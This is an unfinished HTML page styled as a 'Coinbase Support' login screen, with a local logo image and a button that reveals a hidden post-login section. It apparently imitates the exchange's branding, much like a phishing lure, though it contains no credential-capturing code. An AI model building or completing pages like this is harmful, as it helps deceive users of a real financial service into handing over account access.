<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Coinbase Support</title>
  <style>
    body {
      margin: 0;
      background-color: #0a0f1c;
      font-family: Arial, sans-serif;

    }
    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      min-height: 100vh;
    }
    .box {
      background-color: #1e293b;
      padding: 40px;

      text-align: center;
    }
    .logo-text {
      width: 180px;
      margin-bottom: 25px;
    }
    input, button {
      font-size: 16px;
      padding: 12px;
      border-radius: 8px;
      width: 100%;
      margin: 10px 0;
      border: none;
      box-sizing: border-box;
    }
    button {
      background-color: #3b82f6;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="box">
      <img src="coinbase-logo.png" alt="Coinbase Logo" class="logo-text"/>

      <button onclick="document.getElementById('after-login').style.display='block'; window.scrollTo(0, document.body.scrollHeight)">Log In</button>
